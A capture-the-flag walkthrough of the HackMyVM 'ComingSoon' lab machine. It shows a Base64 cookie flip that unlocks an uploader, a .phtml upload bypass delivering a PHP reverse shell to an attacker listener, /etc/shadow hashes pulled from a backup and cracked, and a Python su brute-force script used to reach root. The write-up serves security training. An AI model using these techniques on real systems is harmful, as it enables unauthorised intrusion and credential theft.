# ComingSoon

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| ComingSoon | rpj7 | Beginner | HackMyVM |

**Summary:** The ComingSoon machine hosts a "Bolt - Coming Soon" landing page on Apache 2.4.51. The initial foothold is gained through a subtle but critical misconfiguration: the web server sets a Base64-encoded cookie named `EnableUploader` with a value of `false`. By decoding this cookie, flipping its value to `true`, and re-sending it, a hidden file-upload endpoint (`5df03f95b4ff4f4b5dabe53a5a1e15d7.php`) is unlocked. The upload endpoint blocks `.php` files, but this restriction is trivially bypassed using the `.phtml` extension, allowing a PHP reverse shell to be uploaded and executed as `www-data`. Post-exploitation enumeration of `/var/backups/` reveals a `backup.tar.gz` archive containing the live `/etc/shadow` file, from which the `scpuser` yescrypt hash is cracked offline using John the Ripper (rockyou.txt), yielding the password `tigger`. Once pivoted to `scpuser`, a file named `.oldpasswords` discloses a pattern of animated-movie-themed root passwords. A targeted Python brute-force script using `su` iterates over a custom wordlist of movie title variations and finds the root password to be `ToyStory3`, achieving full system compromise.

---

## Phase 1 — Reconnaissance

### Network Discovery

A PowerShell network sweep was used to identify live hosts on the `192.168.100.0/24` subnet. The target was found at `192.168.100.147`, with a VirtualBox MAC address fingerprint confirming it as a CTF machine.

```powershell
S D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.147 08:00:27:05:C6:FD VirtualBox
```

### Port Scanning

A full-port Nmap scan with service and default-script detection was launched against the target. Only two ports were found open:

- **Port 22** — OpenSSH 8.4p1 (Debian)
- **Port 80** — Apache httpd 2.4.51 serving the "Bolt - Coming Soon Template"

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/comingsoon]
└─$ nmap -sC -sV -p- -T4 192.168.100.147
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-06 14:08 WIB
Nmap scan report for 192.168.100.147
Host is up (0.0097s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 bc:fb:ec:b8:93:d4:e2:78:76:eb:1b:dc:4b:a7:7f:9b (RSA)
|   256 31:41:a0:d7:e9:3c:79:11:c2:f0:81:a0:fe:2d:f9:b0 (ECDSA)
|_  256 c9:34:17:00:31:75:4d:c0:3a:a5:b1:16:36:0d:bb:18 (ED25519)
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
|_http-title: Bolt - Coming Soon Template
|_http-server-header: Apache/2.4.51 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.64 seconds
```

### Web Application — Initial Look

Browsing to `http://192.168.100.147/` presents a standard "Bolt - Coming Soon" landing page built on Bootstrap HTML5. The countdown timer was at **25 Days, 09 Hours, 48 Minutes, 10 Seconds** at time of capture. Notably, only "NOTIFY ME" and "ABOUT US" buttons are visible — no upload functionality is exposed to unauthenticated visitors.

![](image.png)

---

## Phase 2 — Vulnerability Discovery

### Hidden Cookie — Base64-Encoded Feature Flag

Inspecting the raw HTTP response headers using `curl -I` revealed an unusual cookie that is not typically set by static web templates:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/comingsoon]
└─$ curl -I http://192.168.100.147/
HTTP/1.1 200 OK
Date: Fri, 06 Mar 2026 07:10:08 GMT
Server: Apache/2.4.51 (Debian)
Set-Cookie: RW5hYmxlVXBsb2FkZXIK=ZmFsc2UK
Content-Type: text/html; charset=UTF-8
```

The cookie name and value both appear to be Base64-encoded. Decoding them confirms this:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/comingsoon]
└─$ echo "RW5hYmxlVXBsb2FkZXIK" | base64 -d
EnableUploader
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/comingsoon]
└─$ echo "ZmFsc2UK" | base64 -d
false
```

The cookie `EnableUploader=false` acts as a server-side feature flag that controls whether the image uploader is shown. By encoding `true` to Base64 and substituting the value, the feature can be activated:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/comingsoon]
└─$ echo -n "true" | base64
dHJ1ZQ==
```

---

## Phase 3 — Initial Access

### Unlocking the Hidden Upload Endpoint

Sending the forged cookie `RW5hYmxlVXBsb2FkZXIK=dHJ1ZQ==` causes the PHP application to render an additional **Upload** button in the HTML source that links to an obfuscated endpoint: `5df03f95b4ff4f4b5dabe53a5a1e15d7.php`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/comingsoon]
└─$ curl -b "RW5hYmxlVXBsb2FkZXIK=dHJ1ZQ==" http://192.168.100.147/
<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <title>Bolt - Coming Soon Template</title>

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" type="text/css" href="assets/css/bootstrap.min.css" >
    <!-- Fonts -->
    <link rel="stylesheet" type="text/css" href="assets/fonts/line-icons.css">
    <!-- Slicknav -->
    <link rel="stylesheet" type="text/css" href="assets/css/slicknav.css">
    <!-- Off Canvas Menu -->
    <link rel="stylesheet" type="text/css" href="assets/css/menu_sideslide.css">
    <!-- Color Switcher -->
    <link rel="stylesheet" type="text/css" href="assets/css/vegas.min.css">
    <!-- Animate -->
    <link rel="stylesheet" type="text/css" href="assets/css/animate.css">
    <!-- Main Style -->
    <link rel="stylesheet" type="text/css" href="assets/css/main.css">
    <!-- Responsive Style -->
    <link rel="stylesheet" type="text/css" href="assets/css/responsive.css">

  </head>
  <body>

    <div class="bg-wraper overlay has-vignette">
      <div id="example" class="slider opacity-50 vegas-container" style="height: 983px;"></div>
    </div>

    <!-- Coundown Section Start -->
    <section class="countdown-timer">
      <div class="container">
        <div class="row text-center">
          <div class="col-md-12 col-sm-12 col-xs-12">
            <div class="heading-count">
              <h2>New site coming soon</h2>
            </div>
          </div>
          <div class="col-md-12 col-sm-12 col-xs-12">
            <div class="row time-countdown justify-content-center">
              <div id="clock" class="time-count"></div>
            </div>
            <p>
            Bolt - High quality Bootstrap HTML5 Coming Soon Landing Page Template<br>
            Comes with fully responsive layout, Cool features, and Clean design.
            </p>
            <div class="button-group">
              <a href="#" class="btn btn-common">Notify Me</a>
              <a href="#" class="btn btn-border">About Us</a>
              <!-- Upload images link if EnableUploader set -->
              <a href='5df03f95b4ff4f4b5dabe53a5a1e15d7.php' class='btn btn-border'>Upload</a>            </div>
            <div class="social mt-4">
              <a class="facebook" href="#"><i class="lni-facebook-filled"></i></a>
              <a class="twitter" href="#"><i class="lni-twitter-filled"></i></a>
              <a class="instagram" href="#"><i class="lni-instagram-filled"></i></a>
              <a class="google" href="#"><i class="lni-google-plus"></i></a>
            </div>
          </div>
        </div>
      </div>
    </section>
    <!-- Coundown Section End -->

    <!-- Preloader -->
    <div id="preloader">
      <div class="loader" id="loader-1"></div>
    </div>
    <!-- End Preloader -->

    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="assets/js/jquery-min.js"></script>
    <script src="assets/js/popper.min.js"></script>
    <script src="assets/js/bootstrap.min.js"></script>
    <script src="assets/js/vegas.min.js"></script>
    <script src="assets/js/jquery.countdown.min.js"></script>
    <script src="assets/js/classie.js"></script>
    <script src="assets/js/jquery.nav.js"></script>
    <script src="assets/js/jquery.easing.min.js"></script>
    <script src="assets/js/wow.js"></script>
    <script src="assets/js/jquery.slicknav.js"></script>
    <script src="assets/js/main.js"></script>
    <script src="assets/js/form-validator.min.js"></script>
    <script src="assets/js/contact-form-script.min.js"></script>

    <script type="text/javascript">
      $("#example").vegas({
          timer: false,
          delay: 6000,
          transitionDuration: 2000,
          transition: "blur",
          slides: [
              { src: "assets/img/slide1.jpg" },
              { src: "assets/img/slide2.jpg" },
              { src: "assets/img/slide3.jpg" }
          ]
      });
    </script>

  </body>
</html>
```

Visiting the upload endpoint while authenticated with the cookie returns a basic file upload form:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/comingsoon]
└─$ curl -b "RW5hYmxlVXBsb2FkZXIK=dHJ1ZQ==" http://192.168.100.147/5df03f95b4ff4f4b5dabe53a5a1e15d7.php
<!DOCTYPE html>
<html>
<body>

<form  method="post" enctype="multipart/form-data">
  Select image to upload:
  <input type="file" name="fileToUpload" id="fileToUpload">
  <input type="submit" value="Upload Image" name="submit">
</form>

</body>
</html>
```

### PHP Reverse Shell Upload — Extension Bypass

A PHP reverse shell was copied from the Kali wordshells collection, and the attacker IP (`192.168.100.1`) and listener port (`4444`) were configured:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/comingsoon]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php ./revshell.php

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/comingsoon]
└─$ vim ./revshell.php
```

The first upload attempt using `.php` extension was blocked by a server-side filter:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/comingsoon]
└─$ curl -b "RW5hYmxlVXBsb2FkZXIK=dHJ1ZQ==" -F "fileToUpload=@revshell.php" -F "submit=Upload Image" http://192.168.100.147/5df03f95b4ff4f4b5dabe53a5a1e15d7.php
For security, .php files are allowed.Sorry, your file was not uploaded.
```

> **Note:** The error message — "For security, .php files are allowed" — appears to be a developer mistake in the error message wording. The intent was to block `.php`, but the filter only checks the exact `.php` extension, leaving alternative PHP-executable extensions like `.phtml` unchecked.

The file was renamed to use the `.phtml` extension, which Apache also passes to the PHP interpreter, and the upload succeeded:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/comingsoon]
└─$ cp revshell.php revshell.phtml

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/comingsoon]
└─$ curl -b "RW5hYmxlVXBsb2FkZXIK=dHJ1ZQ==" -F "fileToUpload=@revshell.phtml" -F "submit=Upload Image" http://192.168.100.147/5df03f95b4ff4f4b5dabe53a5a1e15d7.php
The file revshell.phtml has been uploaded. 
```

### Obtaining the Reverse Shell

A Netcat listener was set up and then the uploaded shell was triggered via `curl`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/comingsoon]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/comingsoon]
└─$ curl http://192.168.100.147/assets/img/revshell.phtml
```

The shell connected back immediately:

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 59204
Linux comingsoon.hmv 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64 GNU/Linux
 07:20:55 up 13 min,  0 users,  load average: 0.27, 0.21, 0.11
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python3
/usr/bin/python3
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@comingsoon:/$ ^Z
zsh: suspended  nc -lnvp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/comingsoon]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444

www-data@comingsoon:/$ export SHELL=/bin/bash
www-data@comingsoon:/$ export TERM=xterm-256color
www-data@comingsoon:/$ stty rows 50 cols 200
www-data@comingsoon:/$
```

A fully interactive TTY shell is established as `www-data`.

---

## Phase 4 — Internal Enumeration

### User Discovery and Home Directory

Filtering `/etc/passwd` for users with login shells reveals a second user, `scpuser`, with a home directory at `/home/scpuser`:

```bash
www-data@comingsoon:/$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
scpuser:x:1001:1001::/home/scpuser:/bin/bash
www-data@comingsoon:/$ ls -la /home/scpuser/
total 32
drwxr-xr-x 4 scpuser scpuser 4096 Dec 17  2021 .
drwxr-xr-x 3 root    root    4096 Dec 16  2021 ..
lrwxrwxrwx 1 root    root       9 Dec 15  2021 .bash_history -> /dev/null
-rw-r--r-- 1 scpuser scpuser  220 Aug  4  2021 .bash_logout
-rw-r--r-- 1 scpuser scpuser 3526 Aug  4  2021 .bashrc
drwxr-xr-x 3 scpuser scpuser 4096 Dec 15  2021 .local
-rw-rw---- 1 scpuser scpuser  123 Dec 16  2021 .oldpasswords
-rw-r--r-- 1 scpuser scpuser  807 Aug  4  2021 .profile
drwx------ 2 scpuser scpuser 4096 Dec 15  2021 .ssh
lrwxrwxrwx 1 root    root      21 Dec 16  2021 user.txt -> /media/flags/user.txt
www-data@comingsoon:/$
```

Of particular note: `.bash_history` is symlinked to `/dev/null` (no history), there is an `.oldpasswords` file readable only by `scpuser`, and `user.txt` is a symlink to `/media/flags/user.txt`.

### Web Root Notes

Checking the web root reveals a `notes.txt` file left by the web developer:

```bash
www-data@comingsoon:/$ cd /var/www/html
www-data@comingsoon:/var/www/html$ ls -la
total 32
drwxr-xr-x 3 root root 4096 Dec 17  2021 .
drwxr-xr-x 3 root root 4096 Dec 15  2021 ..
-rw-r--r-- 1 root root 1246 Dec 16  2021 5df03f95b4ff4f4b5dabe53a5a1e15d7.php
drwxr-xr-x 6 root root 4096 Dec 17  2021 assets
-rw-r--r-- 1 root root 4389 Dec 16  2021 index.php
-rw-r--r-- 1 root root  528 Dec 15  2021 license.txt
-rw-r--r-- 1 root root  279 Dec 17  2021 notes.txt
```

```bash
www-data@comingsoon:/var/www/html$ cat notes.txt
Dave,

Last few jobs to do...

Set ssh to use keys only (passphrase same as the password)

Just need to sort the images out:
resize and scp them or using the built-in image uploader.

Test the backups and delete anything not needed.

Apply an https certificate.

Cheers,

Webdev
```

> **Key intelligence:** SSH is configured to use key-based authentication only, with the passphrase being the same as the user's password. A backup archive should exist. `Dave` is likely the `scpuser` account.

```bash
www-data@comingsoon:/var/www/html$ cat license.txt
Thanks for using the free version of Bolt. Please, consider purchasing the full version of Bolt to Enjoy All Features and Freedom to Use in Commercial Projects.

LIMITATIONS OF FREE VERSION:

1. Commercial Use - Not Allowed
2. Removing Footer Credit - Not Allowed
4. All Features - Not Available
6. Documentation and Support - Not Provided
7. Royalty Free Images - Not Provided

To purchase commercial license please visit: https://uideck.com/products/bolt-free-coming-soon-template/ and choose commercial license.

Best regards
```

### Extracting Credentials from Backup Archive

The `/var/backups/` directory is world-readable and contains a recently updated `backup.tar.gz` (timestamp `Mar 6 07:15`, matching the runtime):

```bash
www-data@comingsoon:/var/www/html$ cd /var/backups/
www-data@comingsoon:/var/backups$ ls -la
total 2024
drwxr-xr-x  2 root root    4096 Mar  6 07:15 .
drwxr-xr-x 12 root root    4096 Dec 15  2021 ..
-rw-r--r--  1 root root   30720 Dec 15  2021 alternatives.tar.0
-rw-r--r--  1 root root    9128 Dec 15  2021 apt.extended_states.0
-rw-r--r--  1 root root     990 Dec 15  2021 apt.extended_states.1.gz
-rw-r--r--  1 root root 1541366 Mar  6 07:15 backup.tar.gz
-rw-r--r--  1 root root       0 Dec 16  2021 dpkg.arch.0
-rw-r--r--  1 root root      32 Dec 15  2021 dpkg.arch.1.gz
-rw-r--r--  1 root root     186 Dec 15  2021 dpkg.diversions.0
-rw-r--r--  1 root root     126 Dec 15  2021 dpkg.diversions.1.gz
-rw-r--r--  1 root root     172 Dec 15  2021 dpkg.statoverride.0
-rw-r--r--  1 root root     120 Dec 15  2021 dpkg.statoverride.1.gz
-rw-r--r--  1 root root  354260 Dec 15  2021 dpkg.status.0
-rw-r--r--  1 root root   90231 Dec 15  2021 dpkg.status.1.gz
www-data@comingsoon:/var/backups$ cp /var/backups/backup.tar.gz /tmp/
www-data@comingsoon:/var/backups$ cd /tmp/
```

Listing the archive contents confirms it includes a snapshot of `/etc/passwd` and critically, `/etc/shadow`:

```bash
www-data@comingsoon:/tmp$ tar -ztvf backup.tar.gz
drwxr-xr-x root/root         0 2021-12-15 11:06 var/www/
drwxr-xr-x root/root         0 2021-12-17 11:15 var/www/html/
...
-rw-r--r-- root/root           1475 2021-12-16 00:27 etc/passwd
-rw-r----- root/shadow          911 2021-12-16 00:27 etc/shadow
```

> **Critical finding:** The archive preserves the original file ownership and permissions metadata (`root/shadow`), but since `tar` extracts files owned by the extracting user by default (without `--same-owner`), `www-data` can read the extracted shadow file.

```bash
www-data@comingsoon:/tmp$ tar -zxvf backup.tar.gz etc/shadow etc/passwd
etc/passwd
etc/shadow
www-data@comingsoon:/tmp$ cat etc/shadow
root:$y$j9T$/E0VUDL7uS9RsrvwmGcOH0$LEB/7ERUX9bkm646n3v3RJBxttSVWmTBvs2tUjKe9I6:18976:0:99999:7:::
...
scpuser:$y$j9T$rVt3bxjp6uYKKYJbYU2Zq0$Ysn02LrCwTUB7iQdRiROO7/WQi8JSGtwLZllR54iX0.:18976:0:99999:7:::
```

### Cracking the Hash Offline

The `scpuser` yescrypt (`$y$`) hash was saved locally and cracked using John the Ripper with the rockyou wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/comingsoon]
└─$ cat hash
$y$j9T$rVt3bxjp6uYKKYJbYU2Zq0$Ysn02LrCwTUB7iQdRiROO7/WQi8JSGtwLZllR54iX0.

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/comingsoon]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=crypt
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tigger           (?)
1g 0:00:00:01 DONE (2026-03-06 14:40) 0.9090g/s 87.27p/s 87.27c/s 87.27C/s 123456..yellow
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

**`scpuser` password: `tigger`**

---

## Phase 5 — Lateral Movement to `scpuser`

Using the cracked password, `su` is used to switch to the `scpuser` account:

```bash
www-data@comingsoon:/tmp$ su - scpuser
Password:
scpuser@comingsoon:~$ id
uid=1001(scpuser) gid=1001(scpuser) groups=1001(scpuser)
scpuser@comingsoon:~$ ls -la
total 32
drwxr-xr-x 4 scpuser scpuser 4096 Dec 17  2021 .
drwxr-xr-x 3 root    root    4096 Dec 16  2021 ..
lrwxrwxrwx 1 root    root       9 Dec 15  2021 .bash_history -> /dev/null
-rw-r--r-- 1 scpuser scpuser  220 Aug  4  2021 .bash_logout
-rw-r--r-- 1 scpuser scpuser 3526 Aug  4  2021 .bashrc
drwxr-xr-x 3 scpuser scpuser 4096 Dec 15  2021 .local
-rw-rw---- 1 scpuser scpuser  123 Dec 16  2021 .oldpasswords
-rw-r--r-- 1 scpuser scpuser  807 Aug  4  2021 .profile
drwx------ 2 scpuser scpuser 4096 Dec 15  2021 .ssh
lrwxrwxrwx 1 root    root      21 Dec 16  2021 user.txt -> /media/flags/user.txt
```

### Old Password File — Root Password Pattern Intelligence

The `.oldpasswords` file is now readable and reveals that the root password follows an animated movie title + sequel number pattern:

```bash
scpuser@comingsoon:~$ cat .oldpasswords
Previous root passwords just incase they are needed for a backup\restore

Incredibles2
Paddington2
BigHero6
101Dalmations
```

---

## Phase 6 — Privilege Escalation to Root

### Building a Targeted Wordlist

Cross-referencing the pattern of previous passwords (animated movie sequels) with external knowledge of similar themed passwords (movie titles with numbered variants), a comprehensive wordlist of 100+ candidates was generated:

```text
Incredibles1
Incredibles2
Incredibles3
Paddington1
Paddington2
Paddington3
BigHero1
BigHero6
BigHero7
101Dalmatians
101Dalmations
102Dalmatians
ToyStory1
ToyStory2
ToyStory3
ToyStory4
Frozen1
Frozen2
Frozen3
IceAge1
IceAge2
IceAge3
IceAge4
IceAge5
DespicableMe1
DespicableMe2
DespicableMe3
Minions1
Minions2
Shrek1
Shrek2
Shrek3
Shrek4
Shrek5
Cars1
Cars2
Cars3
KungFuPanda1
KungFuPanda2
KungFuPanda3
KungFuPanda4
Madagascar1
Madagascar2
Madagascar3
HowToTrainYourDragon1
HowToTrainYourDragon2
HowToTrainYourDragon3
FindingNemo
FindingDory
Zootopia1
Zootopia2
Ratatouille1
Ratatouille2
Moana1
Moana2
Coco1
Coco2
Up1
Up2
WallE1
WallE2
MonstersInc1
MonstersInc2
MonstersUniversity
Brave1
Brave2
Tangled1
Tangled2
InsideOut1
InsideOut2
Sing1
Sing2
Trolls1
Trolls2
TheLegoMovie1
TheLegoMovie2
HotelTransylvania1
HotelTransylvania2
HotelTransylvania3
HotelTransylvania4
Rio1
Rio2
Bolt1
Bolt2
Megamind1
Megamind2
WreckItRalph1
WreckItRalph2
RalphBreaksTheInternet
TheCroods1
TheCroods2
SpidermanIntoTheSpiderverse
SpidermanAcrossTheSpiderverse
SpidermanBeyondTheSpiderverse
PussInBoots1
PussInBoots2
TheLastWish
Soul2020
Luca2021
Encanto2021
TurningRed2022
```

### Python Brute-Force Script via `su`

A Python script was written directly on the target to brute-force the root password using `su`, exploiting the fact that `su` can be called non-interactively via `subprocess`:

```bash
scpuser@comingsoon:~$ nano pass.txt
scpuser@comingsoon:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
scpuser@comingsoon:~$ nano brute.py
scpuser@comingsoon:~$ cat brute.py
import subprocess
import sys

with open('pass.txt', 'r') as f:
    passwords = f.read().splitlines()

for password in passwords:
    print(f"[*] Testing: {password}")
    child = subprocess.Popen(['su', '-', '-c', 'whoami'],
                             stdin=subprocess.PIPE,
                             stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE,
                             text=True)

    try:
        stdout, stderr = child.communicate(input=password + '\n', timeout=2)
        if "root" in stdout:
            print(f"\n[+] FOUND ROOT PASSWORD: {password}")
            sys.exit(0)
    except Exception:
        child.kill()
scpuser@comingsoon:~$ python3 brute.py
[*] Testing: Incredibles1
[*] Testing: Incredibles2
[*] Testing: Incredibles3
[*] Testing: Paddington1
[*] Testing: Paddington2
[*] Testing: Paddington3
[*] Testing: BigHero1
[*] Testing: BigHero6
[*] Testing: BigHero7
[*] Testing: 101Dalmatians
[*] Testing: 101Dalmations
[*] Testing: 102Dalmatians
[*] Testing: ToyStory1
[*] Testing: ToyStory2
[*] Testing: ToyStory3

[+] FOUND ROOT PASSWORD: ToyStory3
```

**Root password: `ToyStory3`**

### Root Shell and Flags

```bash
scpuser@comingsoon:~$ su - root
Password:
root@comingsoon:~# id
uid=0(root) gid=0(root) groups=0(root)
root@comingsoon:~# whoami;hostname
root
comingsoon.hmv
root@comingsoon:~# cat /home/scpuser/user.txt /root/root.txt
HMV{use[REDACTED]}
HMV{roo[REDACTED]}
```

Full root compromise achieved. Both the user and root flags were successfully captured.

---

## Attack Chain Summary

1. **Reconnaissance**: Full-port Nmap scan identified two open services — SSH (22) and HTTP (80). The web server runs Apache 2.4.51 on Debian, serving a "Bolt - Coming Soon" Bootstrap template.

2. **Vulnerability Discovery**: `curl -I` against the web root revealed a Base64-encoded cookie `RW5hYmxlVXBsb2FkZXIK=ZmFsc2UK`, which decodes to `EnableUploader=false`. Re-encoding the value `true` as Base64 (`dHJ1ZQ==`) and setting it in the cookie unlocked a hidden file-upload endpoint (`5df03f95b4ff4f4b5dabe53a5a1e15d7.php`).

3. **Exploitation**: The upload endpoint blocked `.php` files but accepted `.phtml`, which Apache also interprets as PHP. A `.phtml` PHP reverse shell was uploaded to `assets/img/`, triggered via `curl`, and returned a shell as `www-data`.

4. **Internal Enumeration**: Web root `notes.txt` revealed a backup routine. `/var/backups/backup.tar.gz` was world-readable and contained a copy of `/etc/shadow`. The `scpuser` yescrypt hash was extracted and cracked offline with John the Ripper (rockyou.txt), yielding the password `tigger`. Lateral movement to `scpuser` via `su` succeeded.

5. **Privilege Escalation**: `scpuser`'s `.oldpasswords` file disclosed a pattern of animated-movie-themed root passwords (e.g., `Incredibles2`, `BigHero6`). A custom Python brute-force script using `subprocess.Popen(['su', ...])` iterated through a generated wordlist of movie title variations and found the root password to be `ToyStory3`, granting a full root shell.
